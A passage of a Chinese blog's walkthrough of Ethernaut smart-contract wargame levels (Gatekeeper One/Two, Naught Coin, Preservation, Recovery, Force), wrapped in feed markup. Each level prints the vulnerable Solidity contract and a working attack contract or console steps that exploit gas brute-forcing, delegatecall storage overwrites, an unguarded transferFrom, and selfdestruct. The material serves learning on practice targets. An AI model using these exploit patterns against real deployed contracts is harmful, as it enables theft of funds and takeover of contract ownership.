class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft().mod(8191) &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) !&#x3D; uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目想要我们执行enter方法，并且要通过三个修饰器的检查。<br/><br>我们把三个修饰器分开来分析：</p><ul><li>require(msg.sender != tx.origin);<br>这个条件我们再之前做题的时候遇到过，只需要再调用函数时增加一个中间函数，就可以使<code>msg.sender != tx.origin</code></li><li>require(gasleft().mod(8191) == 0);这个条件会比较麻烦一点，gasleft函数返回的是交易剩余的gas量，所以我们只要让gas为8191*n+x即可，其中x为我们此次交易所消耗的gas。理论上来讲可以通过debug得到，但是由于不知道目标合约的编译器版本，所以无法精准得到这个值。但我们可以通过gas爆破来解决。毕竟gas毕竟是在一个范围区间之中的。</li><li><p>require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));<br>require(uint32(uint64(_gateKey)) != uint64(_gateKey));<br>require(uint32(uint64(_gateKey)) == uint16(tx.origin));<br>这个条件要求我们先了解solidity中类型转换的规则<a href="https://www.tutorialspoint.com/solidity/solidity_conversions.htm#:~:text=Solidity%20compiler%20allows%20implicit%20conversion,value%20not%20allowed%20in%20uint256." target="_blank" rel="noopener">参考链接</a><br/><br>这里以_gateKey是0x12345678deadbeef为例说明</p><blockquote><ol><li>uint32(uint64(_gateKey))转换后会取低位，所以变成0xdeadbeef，uint16(uint64(_gateKey))同理会变成0xbeef，uint16和uint32在比较的时候，较小的类型uint16会在左边填充0，也就是会变成0x0000beef和0xdeadbeef做比较，因此想通过第一个require只需要找一个形为0x????????0000????这种形式的值即可，其中?是任取值。</li><li>第二步要求双方不相等，只需高4个字节中任有一个bit不为0即可</li><li>通过前面可知，uint32(uint64(_gateKey))应该是类似0x0000beef这种形式，所以只需要让最低的2个byte和tx.origin地址最低的2个byte相同即可，也就是，key的最低2个字节设置为合约地址的低2个字节。这里tx.origin就是metamask的账户地址</li></ol></blockquote><p>攻击合约：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperOne &#123;</span><br><span class="line">    function entrant() external returns (address);</span><br><span class="line">    function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line">    GatekeeperOne gatekeeperOne;</span><br><span class="line">    address target;</span><br><span class="line">    address entrant;</span><br><span class="line"></span><br><span class="line">    event log(bool);</span><br><span class="line">    event logaddr(address);</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        &#x2F;&#x2F; 设置为题目地址</span><br><span class="line">        target &#x3D; _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        &#x2F;&#x2F; 后四位是metamask上账户地址的低2个字节</span><br><span class="line">        bytes8 key&#x3D;0xAAAAAAAA0000Ff67;</span><br><span class="line">        bool result;</span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; 120; i++) &#123;&#x2F;&#x2F;gas爆破</span><br><span class="line">            (bool result, bytes memory data) &#x3D; address(target).call&#123;gas:i + 150 + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        emit log(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getentrant() public &#123;</span><br><span class="line">        gatekeeperOne &#x3D; GatekeeperOne(target);</span><br><span class="line">        entrant &#x3D; gatekeeperOne.entrant();</span><br><span class="line">        emit logaddr(entrant);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>解题步骤<br>执行exploit方法后执行getentrant,可以在交易详细中看到提交上来的事务中address已经为我们的地址。通关</p></li></ul><h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><p>在做了第一道守门人后，这道题目看起来就easy很多了<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x :&#x3D; extcodesize(caller()) &#125;</span><br><span class="line">    require(x &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) &#x3D;&#x3D; uint64(0) - 1);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>一样的有三个函数修饰器需要满足，我们依旧分开来说</p><ul><li><strong>require(msg.sender != tx.origin);</strong><br>这个和上一个的第一个条件一样，不再赘述，建一个合约就行。</li><li><p><strong>uint x</strong><br><strong>assembly { x := extcodesize(caller()) }</strong><br><strong>require(x == 0);</strong><br>这里涉及到了solidity中的汇编语言，<a href="https://solidity-cn.readthedocs.io/zh/develop/assembly.html#" target="_blank" rel="noopener">参考文档</a>，在这里<code>caller</code>是调用的发起者，<code>extcodesize(a)</code>会返回地址 a 的代码大小。<br>关于这点，需要使用一个特性绕过：当合约正在执行构造函数constructor并部署时，其extcodesize为0。换句话说，如果我们在constructor中调用这个函数的话，那么extcodesize(caller())返回0，因此可以绕过检查。</p></li><li><p><strong>require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);</strong><br>这个条件其实就是一个简单的异或，我们只需要反过来异或一次算出来的结果就是key<br/></p></li></ul><p>攻击合约:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    address target;</span><br><span class="line">    constructor(address _adr) public&#123;</span><br><span class="line">        target &#x3D; _adr;</span><br><span class="line">        bytes8 password &#x3D; bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  uint64(0) - 1);</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,password));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="15-Naught-Coin"><a href="#15-Naught-Coin" class="headerlink" title="15 Naught Coin"></a>15 Naught Coin</h2><p>这关考查对ERC20的了解<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;https:&#x2F;&#x2F;github.com&#x2F;OpenZeppelin&#x2F;openzeppelin-contracts&#x2F;blob&#x2F;release-v3.2.0&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; string public constant name &#x3D; &#39;NaughtCoin&#39;;</span><br><span class="line">  &#x2F;&#x2F; string public constant symbol &#x3D; &#39;0x0&#39;;</span><br><span class="line">  &#x2F;&#x2F; uint public constant decimals &#x3D; 18;</span><br><span class="line">  uint public timeLock &#x3D; now + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) ERC20(&#39;NaughtCoin&#39;, &#39;0x0&#39;) public &#123;</span><br><span class="line">    player &#x3D; _player;</span><br><span class="line">    INITIAL_SUPPLY &#x3D; 1000000 * (10**uint256(decimals()));</span><br><span class="line">    &#x2F;&#x2F; _totalSupply &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    &#x2F;&#x2F; _balances[player] &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender &#x3D;&#x3D; player) &#123;</span><br><span class="line">      require(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>光看这个函数修饰器是没有漏洞可言的，但问题是，ERC20有两个转账函数，题目中只对<code>transfer</code>这一个函数做了修饰，也就是说，我们可以使用另一个函数进行转账-<code>transferFrom</code></p><ul><li>解题步骤<br>直接在控制台操作即可，但要注意，在转账操作之前我们需要先approve<br>val=’1000000000000000000000000’<br>addr=’0x5B38Da6a701c568545dCfcB03FcB875f56beddC4’<ol><li>contract.approve(player,val)</li><li>contract.transferFrom(player,addr,val)</li></ol></li></ul><h2 id="16-Preservation"><a href="#16-Preservation" class="headerlink" title="16 Preservation"></a>16 Preservation</h2><p>这关是对delegatecall漏洞的考查，大家可以看我对delegatecall的另一篇文章<a href="../Delegatecall.html">delegatecall杂谈</a><br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  &#x2F;&#x2F; Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature &#x3D; bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library &#x3D; _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library &#x3D; _timeZone2LibraryAddress; </span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime &#x3D; _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>由于delegatecall的执行环境是当前合约，所以如果要调用的函数内有修改变量的操作，将会导致自身的<strong>对应储存位上</strong>的变量被恶意修改，具体可以参考我的另一篇博客。<br/><br>利用这一点，我们可以实现攻击：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function setTime(uint _time) public &#123;</span><br><span class="line">        owner &#x3D; address(_time);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>由于在perservation里，owner是在第2个存储位，所以我们这里需要两个变量来”占位”,这样就可以做到恶意修改被攻击合约的owner的目的。</p><ul><li>解题步骤</li></ul><ol><li>执行<code>setFirstTime</code>函数，将我们的攻击合约地址作为参数传进去，可以看到此时timeZone1Library已经变为我们攻击合约的地址。<br><img src="1.jpg" alt=""><br><img src="2.jpg" alt=""></li><li>再次执行<code>setFirstTime</code>，此时调用的就是我们的攻击合约了，我们只需要把我们自己的地址作为参数传进去，就可以完成攻击。</li></ol><h2 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17 Recovery"></a>17 Recovery</h2><p>这关考查对区块链浏览器的使用和destroy函数<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts-ethereum-package&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  &#x2F;&#x2F; public variables</span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;</span><br><span class="line">    name &#x3D; _name;</span><br><span class="line">    balances[_creator] &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; msg.value.mul(10);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;&#x3D; _amount);</span><br><span class="line">    balances[msg.sender] &#x3D; balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] &#x3D; _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目中给到了一个合约地址，是<code>Recovery</code>的地址，题目中说创建者通过Recovery创建了一个SimpleToken，然后把地址给忘了，要我们找到这个地址并且把里面的钱弄出来。很容易，通过区块链浏览器就可以找到他创建的<code>SimpleToken</code>。<br/><br>在 <a href="https://rinkeby.etherscan.io/" target="_blank" rel="noopener">https://rinkeby.etherscan.io/</a> 上搜索Recovery的地址，然后我们就可以看到他的创建合约交易，点进去就可以找到合约地址。<br><img src="3.jpg" alt=""><br>得到地址后，我们只需要执行合约的自毁函数即可<br/><br>攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    address payable target;</span><br><span class="line">    address payable owner;</span><br><span class="line">    constructor(address payable _target, address payable _own) public&#123;</span><br><span class="line">        target &#x3D; _target;</span><br><span class="line">        owner &#x3D; _own;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function dosome() public &#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;destroy(address)&quot;,owner));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>在执行dosome()方法的时候最好把交易的gaslimit调高一点，我在执行时如果不调gaslimit是会执行失败的，如图：<br><img src="4.jpg" alt=""></p></blockquote><h2 id="18-Magic-Number"><a href="#18-Magic-Number" class="headerlink" title="18 Magic Number"></a>18 Magic Number</h2><p>这是一个考察solidity操作码的题目<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver &#x3D; _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line">    ____________&#x2F;\\\_______&#x2F;\\\\\\\\\_____        </span><br><span class="line">     __________&#x2F;\\\\\_____&#x2F;\\\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\___       </span><br><span class="line">      ________&#x2F;\\\&#x2F;\\\____\&#x2F;&#x2F;&#x2F;______\&#x2F;&#x2F;\\\__      </span><br><span class="line">       ______&#x2F;\\\&#x2F;\&#x2F;\\\______________&#x2F;\\\&#x2F;___     </span><br><span class="line">        ____&#x2F;\\\&#x2F;__\&#x2F;\\\___________&#x2F;\\\&#x2F;&#x2F;_____    </span><br><span class="line">         __&#x2F;\\\\\\\\\\\\\\\\_____&#x2F;\\\&#x2F;&#x2F;________   </span><br><span class="line">          _\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\&#x2F;&#x2F;____&#x2F;\\\&#x2F;___________  </span><br><span class="line">           ___________\&#x2F;\\\_____&#x2F;\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\&#x2F;&#x2F;&#x2F;_____\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;__</span><br><span class="line">  *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>部署一个只有 10 个 opcode 的合约，该合约在调用后返回 42。<br>因此我们必须使用字节码手动编写一个程序</p><h2 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19 Alien Codex"></a>19 Alien Codex</h2><p>又是一道关于内存布局的题目</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ethernaut 题解 07-12</title>
      <link href="/2022-11-03-ethernaut02/"/>
      <url>/2022-11-03-ethernaut02/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut靶场刷题记录-7-12"><a href="#Ethernaut靶场刷题记录-7-12" class="headerlink" title="Ethernaut靶场刷题记录(7-12)"></a>Ethernaut靶场刷题记录(7-12)</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="07-Force"><a href="#07-Force" class="headerlink" title="07 Force"></a>07 Force</h2><p>这道题是为了考查我们对自毁函数<code>selfdestruct</code>的认识<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;&#x2F;*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         &#x2F;\_&#x2F;\   &#x2F;</span><br><span class="line">    ____&#x2F; o o \</span><br><span class="line">  &#x2F;~____  &#x3D;ø&#x3D; &#x2F;</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*&#x2F;&#125;</span><br></pre></td></tr></table></figure><br>这就是一个空合约，题目想要我们给这个合约转一笔账，可我们知道，一个没有任何函数的合约是没有办法接收转账的。者就用到了自毁函数<code>selfdestruct</code></p><blockquote><p>自毁函数selfdestruct：<br>    当我们调用这个函数时，它会使合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数。（因为之前提到，如果合约收到一笔没有任何函数可以处理的资金时，就会调用fallback函数，而selfdestruct函数无视这一点，也就是资金会优先由selfdestruct函数处理）</p></blockquote><p>我们只需要自己写一个新合约，往里面存一点测试币，然后调用自毁函数<code>selfdestruct</code>将参数设置为此合约的地址，我们合约里的token<br>就会转到此合约当中。<br/><br>攻击合约如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Attck&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">receive() payable external&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function dosome() public payable&#123;</span><br><span class="line">    selfdestruct(0x0F8AaD423dc5aE12382CEc67412dADb6e2b0eFF3);&#x2F;&#x2F;Force的地址</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>解题步骤</li></ul><ol><li>直接使用metamask给我自己的攻击合约转账<br><img src="01.png" 